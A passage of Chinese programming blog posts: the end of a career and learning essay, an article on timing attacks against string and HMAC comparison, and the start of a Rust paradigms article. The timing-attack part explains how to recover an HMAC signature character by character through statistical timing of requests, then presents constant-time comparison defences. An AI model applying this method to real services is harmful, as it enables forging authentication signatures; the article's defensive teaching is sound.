- **技工**，在机器和自动化面前，肯定是需要能够操作机器的技术工人了，这类人是有技术的劳动力。在编程的圈子里俗称“码农”，他们并不是真正的工程师，他们只是电脑程序的操作员，所以，**随着技术门槛的下降或是技术形式的变更他可能就会变得越来越不值钱，直到被淘汰掉**。
- **特种工**，这种人是必须了解原理和解决难题的一类人，他们是解决比较难的、特定的一些技术问题。**当一种技术被淘汰，他并不容易被淘汰，因为他懂原理，原理就是解决问题的能力，是解决问题的套路和方法**。
- **工程师**，不但是使用技术，还可以把活儿做好，他们认为代码更多的时间是在维护，这些人使用各种各样的手段和各种技术，精益求精地持续不断地提高代码的易读性、扩展性、可维护性和重用性，这个过程似乎永无止境。对于这些有“洁癖”，有“工匠精神”，有“修养”的技术人员，我们称他们为工程师。**这种人做事又稳又快，而且可以做出很多称手的工具和方法论**。
- 再往上是**设计师和架构人员**，这些人主要是开发一些工具，框架，模式，提升软件开发和维护效率，同时也提升用户体验，和提升稳定性、性能、代码重用等，总的来说就是为了降本增效。这类人的工作降低了技术得到门槛，他们把技术门槛降低了以后，就可以把这个技术普及开来，就可以由广大劳工、技工、特殊工人使用了。
- 还有一类人是**经理**，经理主要是组织团队、完成项目、创造利润。这类人中，即有身先士卒的leader，也有高高在上的boss，但无论怎么样，这些人只不过是为了让一个公司或是一个团队更好组织在一起的“粘合剂”，这类人只有在大公司中才会变成更有价值。

这就是我总结的世界需要哪些人才，我们了解这些东西以后大概就明白我们现在所处的位置有什么样的问题，我们应该去什么样的地方。

#### Google评分卡

接下来，我们再来看看Google的SRE的自我评分卡：

> 0 – 对于相关的技术领域还不熟悉
> 1 – 可以读懂这个领域的基础知识
> 2 – 可以实现一些小的改动，清楚基本的原理，并能够在简单的指导下自己找到更多的细节。
>
> 3 – 基本精通这个技术领域，完全不需要别人的帮助
> 4 – 对这个技术领域非常的熟悉和舒适，可以应对和完成所有的日常工作。
>
> - 对于软件领域 – 有能力开发中等规模的程序，能够熟练和掌握并使用所有的语言特性，而不是需要翻书，并且能够找到所有的冷知识。
> - 对于系统领域 – 掌握网络和系统管理的很多基础知识，并能够掌握一些内核知识以运维一个小型的网络系统，包括恢复、调试和能解决一些不常见的故障。
>
> 5 – 对于该技术领域有非常底层的了解和深入的技能。
>
> 6 – 能够从零开发大规模的程序和系统，掌握底层和内在原理，能够设计和部署大规模的分布式系统架构
> 7 – 理解并能利用高级技术，以及相关的内在原理，并可以从根本上自动化大量的系统管理和运维工作。
> 8 – 对于一些边角和晦涩的技术、协议和系统工作原理有很深入的理解和经验。能够设计，部署并负责非常关键以及规模很大的基础设施，并能够构建相应的自动化设施
>
> 9 – 能够在该技术领域出一本经典的书。并和标准委员会的人一起工作制定相关的技术标准和方法。
> 10 – 在该领域写过一本书，被业内尊为专家，并是该技术的发明人。

SRE需要自评如下这些技术或技能。

> – TCP/IP Networking (OSI stack, DNS etc)
> – Unix/Linux internals
> – Unix/Linux Systems administration
> – Algorithms and Data Structures
> – C/C++
> – Python
> – Java
> – Perl
> – Go
> – Shell Scripting (sh, Bash, ksh, csh)
> – SQL and/or Database Admin
> – Scripting language of your choice (not already mentioned) _____________
> – People Management
> – Project Management

这个评分卡是面试Google前需要候选人对自己的各种技术进行自评，也算是一种技术人员的等级的度量尺，其把技术的能分成11个等级，我用颜色把其它成四大层级，希望这个评份卡能够给你一个能力提升的参考标准。

#### 认识自己

认识了世界是怎么发展的，也知道技术人员的种类和层级，那么还要了解一下自己，因为如果不了解自己，那么你也无法找到自己的路和适合自己的地方。

我觉得，一个人要认识自己就需要认识自己的特长、兴趣、热情、擅长等，下面是一个认识自己的标准方法：

- **特长**。首先你要找得到自己特长。你要认识自己的特长，找到自己的天赋，找到你在DNA里比别人强的东西，就拿你的DNA跟别人竞争就好了。所以你要找到自己可以干成的事，找到别人找你请教的事，你身边人找你请教就是说明你有特长。这是找到自己特长非常非常重要，扬长避短。
- **兴趣**。如果你没有找到自己特长，就找自己有兴趣有热情的东西。什么叫兴趣？兴趣是再难再累都不会放弃的事。如果你遇到困难就会放弃不叫兴趣，那叫叶公好龙。不怕困难，痴迷其中，就算你没有特长，有了这种特质，你也是头部的人才。
- **方法**。如果你没有特长，没有兴趣和热情就要学方法。这种方法就是要有时间观念，要会做计划，要懂统筹、规划对于做过的事情，犯过的错误多总结，举一反三，喜欢自己找答案，自己探究因果关系，这是一些方法，自己总结一些套路。
- **勤奋。**如果你没有特长，没有兴趣，也没有方法，你还能做的事就是勤奋，勤奋注定会让你成为一个比较劳累的人，也是很有可能被淘汰的人随着你的年纪越来越大，你的勤奋也会越来越不值钱。因为年轻人会比你更勤奋，比你更勤奋、比你斗志更强，比你能力更强，比你要钱更少的人会出现。勤奋最不值钱，但是只要你勤奋至少能够自食其力。

以上就是为了应对未来技术变化，作为个人必须要从特长、兴趣、方法一层一层筛选挖掘，**如果没有这些你就要努力和勤奋。就只能接受“福报”了**。

从我个人而言，我不算是特别聪明的人，但自认为对技术还是比较感兴趣的，难的我不怕。有很多比较难啃的技术，聪明点的人啃一个月就懂了，我不行，我可能啃半年。但是没有关系，知识都是死的，只要不怕困难总有一天会懂的。最可怕是畏难，为自己找借口，这样就不太好了。

#### 打好基础

最前面提到我学的各式各样的被淘汰的技术，会让你感觉很迷茫，或是迷失。但前面也提到了“谷歌评分卡”，在这个评分卡中，我们看到了许多基础原理方面的内容，其实要应对未来的变化，很重要的一点就是无招胜有招，以不变应万变。

**变化都是表面的东西，内在的东西其实并没有太多的变化**。理论层面上变得不多，反而形式上的东西今天一个花样，明天一个花样，所以如果要去应对这种变化，就一定要打牢自己的基础，提升内功修养。比如像编程的一些方式和套路，修饰模式原理本质，解耦，提升代码的重用度等。提升代码重用度必须解耦，要跟现实解耦，提升抽象，这些都是一些技术基础。无论用什么语言，都是这么做的。

打牢基础就可以突破瓶颈，不打牢基础没有办法突破瓶颈。**在技术世界不要觉得量变会造成质变，这是不可能的**。技术这个东西就像搞建筑砌砖头，砌砖头砌的再多也不可能让你能成为一个架构师的，因为你**不懂原理，不懂科学方法，你就不可能成长上去的**，就像学数学一样，当你掌握了微积分这种大杀器后，你解题的能力是无所披靡，而微积分这种方式绝对不是你能“量变”出来的。

所以你必须学习基础的理论知识，如果不学这些基础理论知识，还要学习解题思路和方法，如果你只学在表面，那么当这个技术的形式有变化，就会发现以前学的都没用了，要重头学一遍。**掌握技术基础可以让自己找到答案和知识，基础是抽象和归纳，很容易形成进一步的推论**。我们学的很多技术实现都逃不脱基础原理，不管是Java，还是其他语言，只要用TCP用的都是相同的原理，逃不出范围，**只要抓住原理，举一反三，时间一长了，甚至还可以自己推导答案**。对于技术的基础，我会把其它成四类：

- **程序语言**：语言的原理，类库的实现，编程技术（并发、异步等），编程范式，设计模式……
- **系统原理**：计算机系统，操作系统，网络协议，数据库原理……
- **中间件**：消息队列，缓存系统，网关代理，调度系统 ……
- **理论知识**：算法和数据结构，数据库范式，网络七层模型，分布式系统……

**这些知识其实就是一个计算机科学专业的学生他所要学习的原理**，但可惜的是，我们的一些学校教得也很糟糕，不但老师能力不足，而且放着世界上最优秀的教课书不用了，一定要自己写一本。讲也讲不全，还有各种错误，哎……总之，如果你学习用用到的教材不行，那么可以肯定的是你的学习效率一定是很糟糕的。这就是为什么我们大学上完了，还是跟个傻瓜一样，还要在工作中再重新自学。

不过，就算自学，这些基础技术大概需要四五年的时间堆叠。**我工作二十年了，这二十年来基本还是这些原理没变，无论形式怎么变，但是核心永远还是这些，理论创新很难，这是以不变应万变**。

#### 学习效率

![img](photo/learning.pyrimid.jpg)谈到学习效率，就需要拿出这张学习金字塔的图来了。从图可以看到学习方法分布两层，一种是被动学习，也是浅度学习，听讲，阅读，视听，演示都是在被动学习，而与人讨论，自己动手实践，教授给别人是主动学习。主动学习我们称之为深度学习，如果你不能深度学习，你就不能真正学到东西。这也是你会经常有“学那么多干什么，不用就忘了”，这就是浅度学习的症状了。

下面，我给出一些我自己觉得不错的学习经验：

**1、挑选一手知识和信息源。**对于学习方法：第一我们一定要到知识源去挑选知识，知识信息源非常关键，二手信息丢失太大了，谭浩强写的书就丢失太多信息了。**目前计算机一手知识基本都是国外的**，所以**英文非常重要**。我鼓励大家一定读第一手的资料。如果你英语有问题，至少要看翻译过来，最好是原汁原味翻译的，不要我理解了给你讲那种，那种也是被别人嚼一遍再讲给你你没有体会，是别人带着你，别人的体会会影响你，也许你的体会会比他更好，因为是你自己总结出来的东西，所以知识源很重要。

**2、注意原理和基础****第二要注重基础原理**。虽然可以忘记这个技术，但是原理记在心里，我可以徒手实现出来，而且通过原理可以更快学习其他类似的技术。所以原理很重要！当你学会C、C++要学Java和GO都很快。

**3、使用知识图谱****一定要学会使用知识图**，把知识结构化。从一个技术关键点开始不断地关联和细化下去，比如：关于TCP协议，首先第一个要记住状态图，怎么建立连接，怎么断连接，状态怎么变迁。TCP没有连接，是靠状态维护连接的。其次，要了解TCP怎么保证可靠性，就是丢包以后怎么重传，重传有哪些技术点。然后，重传会让你联想到拥塞控制，拥塞控制到滑动窗口……。这基本就是TCP的所有东西了，找到关键点，然后顺着这个脉络一点点往下想，通过知识图关联就可以进行顺藤摸瓜。我们不需要记所有知识，那些**手册的知识不需要记，你知道在哪里能找到就可以了**。你脑子里面要有地图，学一个东西就跟在城市生活一样，闭上眼睛就知道地图，A点到B点怎么去大概方向要知道。我在北京我去广州，广州在南边，我大概坐飞机还是火车要心里有数。。

**4、学会举一反三**。就是用不同方法学一个东西，比如说学TCP协议，看书是一种方法，编程是另外一种方法，还有用做Debug去看的，用不同方法学一个东西会让你更加熟悉，你学一个知识的同时把周边也学了。比如说学前端能不能把HTTP学一下，比如说长连接、短连接，包括hp1、hp2有一些不一样的东西。

**5、总结和归纳。**只有学会总结和归纳，才能形成自己的思维框架、自己的套路、自己的方法论，以后学这个东西应该怎么学。就像学一门新的语言，不管GO语言，还是Rust语言，第一件事情就是了解内存是怎么管理的，数据类型什么样，第二是泛型怎么搞，第三是并发怎么弄。还有一些抽象怎么弄，比如说怎么解耦，怎么实现多态？套路这种东西只有学的多了以后才能形成套路，如果你只学会一门语言不会有套路，你要每年学门语言，不用学多精，你思考这个语言有什么不一样，为什么这个这种有玩法，那个有那种玩法，这些东西思考多了套路方法论就出来了。比如说Windows和Linux有什么不同，Linux和Unix又有什么不同？只有总结自己的框架、套路和方法，这些才永远不会被淘汰。

**6、实践和坚持。**剩下就是多做多练，多坚持，只有实践才会有经验，只有锻炼了才能够把自己的脂肪变没，所以，**要把知识变成技能必须练**，就像小学生学会加减乘除，还是要演练，必须多做题，题目做得多了，自然掌握得好。要挑选好的知识源，注重原理技术，有一些原理的基础的书太枯燥，但是我告诉你学习这些基础太值得投入时间，搬砖赚几十元不值得，因为赚的是辛苦钱，老了就赚不了，必须要赚更有能力的钱，这是学习投资。

#### 小结

好了，该到这篇文章收尾的时候了，小结一下，如果你想更好的把握时代，提升自己，你需要知道这个时代的趋势是什么，需要什么样的人，这些人需要什么样的能力，这些能力是怎么获得的，投入到基础知识的学习就像“基建”一样，如果基础不好，不能长高，学习能力也是需要适应这个快速时代的重要的基础能力，没有好的学习能力，很快就会掉队被淘汰。

这些东西，是我从业二十年来的总结和体会，希望对你有用。

（全文完）

# 计时攻击 TIMING ATTACKS

#####  [2020年07月05日 ](https://coolshell.cn/articles/21003.html) [Tanglei.Name](https://coolshell.cn/articles/author/tanglei-name) 评论 [46 条评论](https://coolshell.cn/articles/21003.html#comments) 71,081 人阅读

![img](photo/time-bomb-300x300.png)本文来自读者“程序猿石头”的投稿文章《[这 10 行比较字符串相等的代码给我整懵了，不信你也来看看](http://mp.weixin.qq.com/s?__biz=MzI3OTUzMzcwNw==&mid=100002290&idx=1&sn=8829db16a065f485b257fba0c691d94f&chksm=6b4708165c30810096133f36523c8c781ce5333d851c31905d6cc49dd9b756a3f08141fbc9e8#rd)》，原文写的很好，但不够直接了当，信息密度不够高，所以我对原文进行大量的删减、裁剪、改写和添加，主要删除了一些没有信息的段落，主要加入了如何实施计时攻击相关的其它内容，让这篇文章中的知识更系统一些，并且还指出了其它的一些问题。所以，我把标题也改成了《计时攻击 Timing Attacks》。

目录



[另类的字符串比较](https://coolshell.cn/articles/21003.html#另类的字符串比较)[计时攻击(Timing Attack)](https://coolshell.cn/articles/21003.html#计时攻击Timing_Attack)[各语言的对应函数](https://coolshell.cn/articles/21003.html#各语言的对应函数)[One More Thing](https://coolshell.cn/articles/21003.html#One_More_Thing)

#### 另类的字符串比较

在 Java 的 Play Framework 里有[一段代码](https://github.com/playframework/play1/blob/b01eb02eb8df2e94cac2793c028dd9c4c5a57b31/framework/src/play/mvc/CookieDataCodec.java#L82)用来验证cookie(session)中的数据是否合法（包含签名的验证）的代码，如下所示：

**boolean** safeEqual(**String** a, **String** b) {

   **if** (a.length() != b.length()) {

​       **return** **false**;

   }

   **int** equal = 0;

   **for** (**int** i = 0; i < a.length(); i++) {

​       equal |= a.charAt(i) ^ b.charAt(i);

   }

   **return** equal == 0;

}

相信刚看到这段源码的人会感觉挺奇怪的，这个函数的功能是比较两个字符串是否相等，如果要判断两个字符串是否相等，正常人的写法应该是下面这个样子的（来自JDK8 的 `String.equals()`-有删减）：



**public** **boolean** equals(Object anObject) {

​    **String** anotherString = (**String**)anObject;

​    **int** n = value.length;

​    **if** (n == anotherString.value.length) {

​        **char** v1[] = value;

​        **char** v2[] = anotherString.value;

​        **int** i = 0;

​        **while** (n-- != 0) {

​            **if** (v1[i] != v2[i]) // <- 遇到第一个不一样的字符时退出

​                **return** **false**;

​            i++;

​        }

​        **return** **true**;

​    }

​    **return** **false**;

}

我们可以看到，在比较两个字符串是否相等的正常写法是：

1. 先看一下两个字符串长度是否相等，如果不等直接返回 false。
2. 如果长度相等，则依次判断每个字符是否相等，如果不等则返回 false。
3. 如果全部相等，则返回 true。一旦遇到不一样的字符时，直接返回false。

然而，Play Framework里的代码却不是这样的，尤其是上述的第2点，用到了异或，熟悉位操作的你很容易就能看懂，通过异或操作 `1^1=0` , `1^0=1`, `0^0=0`，来比较每一位，如果每一位都相等的话，两个字符串肯定相等，最后存储累计异或值的变量 `equal`必定为 0（因为相同的字符必然为偶数），否则为 1。

但是，这种异或的方式不是遇到第一个不一样的字符就返回 false 了，而是要做全量比较，这种比较完全没有效率，这是为什么呢？原因是为了安全。

#### 计时攻击(Timing Attack)

计时攻击（[Wikipedia](https://en.wikipedia.org/wiki/Timing_attack)）是[旁道攻击](https://en.wikipedia.org/wiki/Side-channel_attack)(或称”侧信道攻击”， Side Channel Attack， 简称SCA) 的一种，**旁通道攻击**是指基于从计算机系统的实现中获得的信息的任何攻击 ，而不是基于实现的算法本身的弱点（例如，密码分析和软件错误）。时间信息，功耗，电磁泄漏甚至声音可以提供额外的信息来源，可以加以利用。在很多物理隔绝的环境中（黑盒），往往也能出奇制胜，这类新型攻击的有效性远高于传统的密码分析的数学方法。（注：企图通过社会工程学欺骗或强迫具有合法访问权限的人来破坏密码系统通常不被视为旁道攻击）

计时攻击是最常用的攻击方法。那么，正常的字符串比较是怎么被黑客进行时间攻击的呢？

我们知道，正常的字符串比较，一旦遇到每一个不同的字符就返回失败了，所以，理论上来说，前面只有2个字符相同字符串比较的耗时，要比前面有10个字符相同的比较要短。你会说，这能相差多少呢？可能几微秒吧。但是，我们可以放大这个事。比如，在Web应用时，记录每个请求的返回所需请求时间（一般是毫秒级），如果我们重复50次，我们可以查看平均时间或是p50的时间，以了解哪个字符返回的时间比较长，如果某个我们要尝试的字符串的时间比较长，我们就可以确定地得出这个这字符串的前面一段必然是正确的。（当然，你会说网络请求的燥音太多了，在毫秒级的请求上完全没办判断，这个需要用到统计学来降噪，后面会给出方法）

这个事情，可以用来做HMAC的攻击，所谓HMAC，你可以参看本站的《[HTTP API 认证授权术](https://coolshell.cn/articles/19395.html)》文章了解更多的细节。简单来说，HMAC，就是客户端向服务端发来一个字符串和其签名字符串（HMAC），然后，服务端的程序用一个私钥来对客户端发来的字符串进行签名得到签名字符串，然后再比较这个签名字符串（所谓签名，也就是使用MD5或SHA这样的哈希算法进行编码，是不可逆的）

写成伪代码大概是这个样子：

**bool** verify(message, digest) {

​    my_digest = HMAC(key, message);

​    **return** my_digest.equals(digest) ;

}

于是，攻击者在不知道签名算法和私钥的情况下，但是知道API的调用接口时，就可以通过一边穷举签名，一边统计调用时间的方式来非常有效率的破解签名。在这篇文章《[HMAC Timing Attacks](http://www.eggie5.com/45-hmac-timing-attacks)》中记录了整个攻击的过程。文章中记载：

如果一个签名有40个长度，如：`f5acdffbf0bb39b2cdf59ccc19625015b33f55fe` 攻击者，从 `0000000000000000000000000000000000000000` 开始穷举，下面是穷举第一个字符（从`0`到`f`因为这是HMAC算法的取值范围）的时间统计。

```
0 0.005450913
1 0.005829198
2 0.004905407
3 0.005286876
4 0.005597611
5 0.004814430
6 0.004969118
7 0.005335884
8 0.004433182
9 0.004440246
a 0.004860263
b 0.004561121
c 0.004463188
d 0.004406799
e 0.004978907
f 0.004887240
```

可以看到，第一次测试通过的计时结果（以秒为单位），而值“ f”与样品的其余部分之间没有较大的变化量，所有结果看起来都非常接近。换句话说，有很多噪声掩盖了信号。因此，有必要进行多个采样（对测试进行缩放）并使用统计工具从噪声中滤除信号。为了将信号与噪声分开，我们必须按任意常数对测试进行缩放。通过实验，作者发现500是一个很好的数字。换句话说：运行测试500次，并记录500个试验中每个试验的结果。然后，通过人的肉眼观察可以可能看到 f 的调用明显比别的要长，但是这种方法很难自动化。

所以，作者给了另一个统计算法，这个算法向服务器分别从 0 到 f 发出16个请求，并记录每个请求的响应时间，并将它们排序为1-16，其中1是最长（最慢）的请求，而16是最短（最快的请求），分别记录 0 – f 的名次，然后重复上述的过程 500 次。如下所示（仅显示25个样本，字符“ 0”首先被排名7、1、3，然后再次排名3……）：

```
{
"0"=>[7, 1, 3, 3, 15, 5, 4, 9, 15, 10, 13, 2, 14, 9, 4, 14, 7, 9, 15, 2, 14, 9, 14, 6, 11...],
"1"=>[13, 4, 7, 11, 0, 4, 0, 2, 14, 11, 6, 7, 2, 2, 14, 11, 8, 10, 5, 13, 11, 7, 4, 9, 3...],
"2"=>[14, 5, 15, 5, 1, 0, 3, 1, 9, 12, 4, 4, 1, 1, 8, 6, 9, 4, 9, 5, 8, 3, 12, 8, 5...],
"3"=>[15, 2, 9, 7, 2, 1, 14, 11, 7, 8, 8, 1, 4, 7, 12, 15, 13, 0, 4, 1, 7, 0, 3, 0, 0...],
"4"=>[12, 10, 14, 15, 8, 9, 10, 12, 10, 4, 1, 13, 15, 15, 3, 1, 6, 8, 2, 6, 15, 4, 0, 3, 2...],
"5"=>[5, 13, 13, 12, 7, 8, 13, 14, 3, 13, 2, 12, 7, 14, 2, 10, 12, 5, 8, 0, 4, 10, 5, 10, 12...]
"6"=>[0, 15, 11, 13, 5, 15, 8, 8, 4, 7, 12, 9, 10, 11, 11, 7, 0, 6, 0, 9, 2, 6, 15, 13, 14...]
"7"=>[1, 9, 0, 10, 6, 6, 2, 4, 12, 9, 5, 10, 5, 10, 7, 2, 4, 14, 6, 7, 13, 11, 6, 12, 4...],
"8"=>[4, 0, 2, 1, 9, 11, 12, 13, 11, 14, 0, 15, 9, 0, 0, 13, 11, 13, 1, 8, 6, 5, 11, 15, 7...],
"9"=>[11, 11, 10, 4, 13, 7, 6, 3, 2, 2, 14, 5, 3, 3, 15, 9, 14, 7, 10, 3, 0, 14, 1, 5, 15...],
"a"=>[8, 3, 6, 14, 10, 2, 7, 5, 1, 3, 3, 0, 0, 6, 10, 12, 15, 12, 12, 15, 9, 13, 13, 11, 9...],
"b"=>[9, 12, 5, 8, 3, 3, 5, 15, 0, 6, 11, 11, 12, 8, 1, 3, 1, 11, 11, 14, 5, 1, 2, 1, 6...],
"c"=>[6, 7, 8, 2, 12, 10, 9, 10, 6, 1, 10, 8, 6, 4, 6, 4, 3, 2, 7, 11, 1, 8, 7, 2, 13...],
"d"=>[2, 14, 4, 0, 14, 12, 11, 0, 8, 0, 15, 3, 8, 12, 5, 0, 10, 1, 3, 4, 12, 12, 8, 14, 8...],
"e"=>[10, 8, 12, 6, 11, 13, 1, 6, 13, 5, 7, 14, 11, 5, 9, 5, 2, 15, 14, 10, 10, 2, 10, 4, 1...],
"f"=>[3, 6, 1, 9, 4, 14, 15, 7, 5, 15, 9, 6, 13, 13, 13, 8, 5, 3, 13, 12, 3, 15, 9, 7, 10...]
}
```

然后将每个字符的500个排名进行平均，得出以下示例输出：

```
"f", 5.302
"0", 7.17
"6", 7.396
"3", 7.472
"5", 7.562
"a", 7.602
"2", 7.608
"8", 7.626
"9", 7.688
"b", 7.698
"1", 7.704
"e", 7.812
"4", 7.82
"d", 7.826
"7", 7.854
"c", 7.86
```

于是，`f` 就这样脱颖而出了。然后，再对剩余的39个字符重复此算法。

**这是一种统计技术，可让我们从噪声中滤出真实的信号**。因此，总共需要调用：16 * 500 * 40 = 320,000个请求，而蛮力穷举需要花费16 ^ 40个请求。

另外，学术界的这篇论文就宣称用这种计时攻击的方法破解了 OpenSSL 0.9.7 的RSA加密算法了。这篇 [Remote Timing Attacks are Practical （PDF）](http://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf)论文中指出（我大致翻译下摘要，感兴趣的同学可以通过链接去看原文）：

> 计时攻击往往用于攻击一些性能较弱的计算设备，例如一些智能卡。我们通过实验发现，也能用于攻击普通的软件系统。本文通过实验证明，通过这种计时攻击方式能够攻破一个基于 OpenSSL 的 web 服务器的私钥。结果证明计时攻击用于进行网络攻击在实践中可行的，因此各大安全系统需要抵御这种风险。

参考资料：

- [Timing Attacks on RSA: Revealing Your Secrets through the Fourth Dimension](http://www.cs.sjsu.edu/faculty/stamp/students/article.html)
- [Remote Timing Attacks are Practical](http://crypto.stanford.edu/~dabo/papers/ssl-timing.pdf)

#### 各语言的对应函数

下面，我们来看看各个语言对计时攻击的对应函数

**PHP**: https://wiki.php.net/rfc/timing_attack

bool hash_equals ( string $known_string , string $user_string )

boolean password_verify ( string $password , string $hash )

**Java**: Java 在1.6时是有问题的，其在 1.6.0._17(6u17)才Fix了这个问题（[相关的fix patch](http://hg.openjdk.java.net/jdk6/jdk6/jdk/rev/562da0baf70b)），下面是 [JDK8源码](https://hg.openjdk.java.net/jdk8u/jdk8u-dev/jdk/file/1832c29655eb/src/share/classes/java/security/MessageDigest.java#l442) – `MessageDigest.isEqual()`

**public** **static** **boolean** MessageDigest.isEqual(**byte**[] digesta, **byte**[] digestb) {

​    **if** (digesta == digestb) **return** **true**;

​    **if** (digesta == **null** || digestb == **null**) {

​        **return** **false**;

​    }

​    **if** (digesta.length != digestb.length) {

​        **return** **false**;

​    }

​    **int** result = 0;

​    // time-constant comparison

​    **for** (**int** i = 0; i < digesta.length; i++) {

​        result |= digesta[i] ^ digestb[i];

​    }

​    **return** result == 0;

}

**C/C++**：没有在常用的库中找到相关的函数，还是自己写吧。

**int** util_cmp_const(const **void** * a, const **void** *b, const size_t size) 

{

  const unsigned **char** *_a = (const unsigned **char** *) a;

  const unsigned **char** *_b = (const unsigned **char** *) b;

  unsigned **char** result = 0;

  size_t i;

  **for** (i = 0; i < size; i++) {

​    result |= _a[i] ^ _b[i];

  }

  **return** result; /* returns 0 if equal, nonzero otherwise */

}

**Python** – 2.7.7+使用 `hmac.compare_digest(a, b)`，否则，使用如下的Django的代码

\#Taken from Django Source Code

**def** constant_time_compare(val1, val2):

​    *"""*

​    *Returns True if the two strings are equal, False otherwise.*

​    *The time taken is independent of the number of characters that match.*

​    *For the sake of simplicity, this function executes in constant time only*

​    *when the two strings have the same length. It short-circuits when they*

​    *have different lengths.*

​    *"""*

​    **if** len(val1) != len(val2):

​        **return** **False**

​    result = 0

​    **for** x, y **in** zip(val1, val2):

​        result |= ord(x) ^ ord(y)

​    **return** result == 0

**Go** – 使用 `crypto/subtle` 代码包

**func** ConstantTimeByteEq(x, y **uint8**) **int**

**func** ConstantTimeCompare(x, y []**byte**) **int**

**func** ConstantTimeCopy(v **int**, x, y []**byte**)

**func** ConstantTimeEq(x, y **int32**) **int**

**func** ConstantTimeLessOrEq(x, y **int**) **int**

**func** ConstantTimeSelect(v, x, y **int**) **int**

#### One More Thing

在文章结束前，再提一个事。

上面的所有的代码都还有一个问题——他们都要判断字符串的长度是否一致，如果不一致就返回了，所以，通过时间攻击是可以知道字符串的长度的。比如：你的密码长度。理论上来说，字符串的长度也应该属于“隐私数据”（当然，对于签名则不是）。

(全文完)

# RUST语言的编程范式

#####  [2020年04月04日 ](https://coolshell.cn/articles/20845.html) [陈皓](https://coolshell.cn/articles/author/haoel) 评论 [107 条评论](https://coolshell.cn/articles/20845.html#comments) 118,183 人阅读

![img](photo/rust-social-wide-360x200.jpg)总是有很多很多人来问我对Rust语言怎么看的问题，在各种地方被at，其实，我不是很想表达我的想法。因为在不同的角度，你会看到不同的东西。编程语言这个东西，老实说很难评价，在学术上来说，Lisp就是很好的语言，然而在工程使用的时候，你会发现Lisp没什么人用，而Javascript或是PHP这样在学术很糟糕设计的语言反而成了主流，你觉得C++很反人类，在我看来，C++有很多不错的设计，而且对于了解编程语言和编译器的和原理非常有帮助。**但是C++也很危险，所以，出现在像Java或Go 语言来改善它，Rust本质上也是在改善C++的。他们各自都有各自的长处和优势**。

因为各个语言都有好有不好，因此，我不想用别的语言来说Rust的问题，或是把Rust吹成朵花以打压别的语言，写成这样的文章，是很没有营养的事。**本文主要想通过Rust的语言设计来看看编程中的一些挑战，尤其是Rust重要的一些编程范式，这样反而更有意义一些，因为这样你才可能一通百通**。

这篇文章的篇幅比较长，而且有很多代码，信息量可能会非常大，所以，**在读本文前，你需要有如下的知识准备**：

- 你对C++语言的一些特性和问题比较熟悉。尤其是：指针、引用、右值move、内存对象管理、泛型编程、智能指针……
- 当然，你还要略懂Rust，不懂也没太大关系，但本文不会是Rust的教程文章，可以参看“[Rust的官方教程](https://doc.rust-lang.org/book/title-page.html)”（[中文版](https://kaisery.github.io/trpl-zh-cn/)）

**因为本文太长，所以，我有必要写上 TL;DR ——**



Java 与 Rust 在改善C/C++上走了完全不同的两条路，他们主要改善的问题就是C/C++ Safety的问题。所谓C/C++编程安全上的问题，主要是：内存的管理、数据在共享中出现的“野指针”、“野引用”的问题。

- 对于这些问题，Java用引用垃圾回收再加上强大的VM字节码技术可以进行各种像反射、字节码修改的黑魔法。
- 而Rust不玩垃圾回收，也不玩VM，所以，作为静态语言的它，只能在编译器上下工夫。如果要让编译器能够在编译时检查出一些安全问题，那么就需要程序员在编程上与Rust语言有一些约定了，其中最大的一个约定规则就是变量的所有权问题，并且还要在代码上“去糖”，比如让程序员说明一些共享引用的生命周期。
- Rust的这些所有权的约定造成了很大的编程上的麻烦，写Rust的程序时，基本上来说，你的程序再也不要想可能轻轻松松能编译通过了。而且，在面对一些场景的代码编写时，如：函数式的闭包，多线程的不变数据的共享，多态……开始变得有些复杂，并会让你有种找不到北的感觉。
- Rust的Trait很像Java的接口，通过Trait可以实现C++的拷贝构造、重载操作符、多态等操作……
- 学习Rust的学习曲线并不平，用Rust写程序，基本上来说，一旦编译通过，代码运行起来是安全的，bug也是很少的。

**如果你对Rust的概念认识的不完整，你完全写不出程序，那怕就是很简单的一段代码**。**这逼着程序员必需了解所有的概念才能编码。但是，另一方面也表明了这门语言并不适合初学者……**

目录



[变量的可变性](https://coolshell.cn/articles/20845.html#变量的可变性)[变量的所有权](https://coolshell.cn/articles/20845.html#变量的所有权)[Owner语义带来的复杂度](https://coolshell.cn/articles/20845.html#Owner语义带来的复杂度)[引用（借用）和生命周期](https://coolshell.cn/articles/20845.html#引用（借用）和生命周期)[引用（借用）](https://coolshell.cn/articles/20845.html#引用（借用）)[生命周期](https://coolshell.cn/articles/20845.html#生命周期)[闭包与所有权](https://coolshell.cn/articles/20845.html#闭包与所有权)[函数闭包](https://coolshell.cn/articles/20845.html#函数闭包)[线程闭包](https://coolshell.cn/articles/20845.html#线程闭包)[Rust的智能指针](https://coolshell.cn/articles/20845.html#Rust的智能指针)[线程与智能指针](https://coolshell.cn/articles/20845.html#线程与智能指针)[多态和运行时识别](https://coolshell.cn/articles/20845.html#多态和运行时识别)[通过Trait多态](https://coolshell.cn/articles/20845.html#通过Trait多态)[向下转型](https://coolshell.cn/articles/20845.html#向下转型)[Trait 重载操作符](https://coolshell.cn/articles/20845.html#Trait_重载操作符)[小结](https://coolshell.cn/articles/20845.html#小结)

#### 变量的可变性

首先，Rust里的变量声明默认是“不可变的”，如果你声明一个变量 `let x = 5;` 变量 `x` 是不可变的，也就是说，`x = y + 10;` 编译器会报错的。如果你要变量的话，你需要使用 `mut` 关键词，也就是要声明成 `let mut x = 5;` 表示这是一个可以改变的变量。这个是比较有趣的，因为其它主流语言在声明变量时默认是可变的，而Rust则是要反过来。这可以理解，不可变的通常来说会有更好的稳定性，而可变的会代来不稳定性。所以，Rust应该是想成为更为安全的语言，所以，默认是 immutable 的变量。当然，Rust同样有 `const` 修饰的常量。于是，Rust可以玩出这么些东西来：

- 常量：`const LEN:u32 = 1024;` 其中的 `LEN` 就是一个`u32` 的整型常量（无符号32位整型），是编译时用到的。
- 可变的变量： `let mut x = 5;` 这个就跟其它语言的类似， 在运行时用到。
- 不可变的变量：`let x= 5;` 对这种变量，你无论修改它，但是，你可以使用 `let x = x + 10;` 这样的方式来重新定义一个新的 `x`。这个在Rust里叫 Shadowing ，第二个 `x` 把第一个 `x` 给遮蔽了。

